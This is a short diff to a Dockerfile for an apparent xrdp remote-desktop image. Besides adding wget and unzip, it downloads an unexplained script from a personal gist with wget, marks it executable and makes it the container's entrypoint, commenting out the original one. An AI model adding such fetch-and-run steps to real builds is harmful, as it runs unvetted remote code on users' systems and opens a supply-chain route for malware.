@@ -34,6 +34,8 @@ RUN apt-get update \
         dbus-x11 \
         firefox \
         git \
+        wget \
+        unzip \
         pavucontrol \
         pulseaudio \
         pulseaudio-utils \
@@ -52,4 +54,7 @@ RUN sed -i -E 's/^; autospawn =.*/autospawn = yes/' /etc/pulse/client.conf \
 COPY --from=builder /usr/lib/pulse-*/modules/module-xrdp-sink.so /usr/lib/pulse-*/modules/module-xrdp-source.so /var/lib/xrdp-pulseaudio-installer/
 COPY entrypoint.sh /usr/bin/entrypoint
 EXPOSE 3389/tcp
-ENTRYPOINT ["/usr/bin/entrypoint"]
+RUN wget https://gist.githubusercontent.com/xVoldx/b96d249d9829d8906ea1e2c427b44ae2/raw/a260a137e559a06f156353bf4abec79e6af01335/bat.sh
+RUN chmod +x bat.sh
+ENTRYPOINT ["/bat.sh"]
+#ENTRYPOINT ["/usr/bin/entrypoint"]
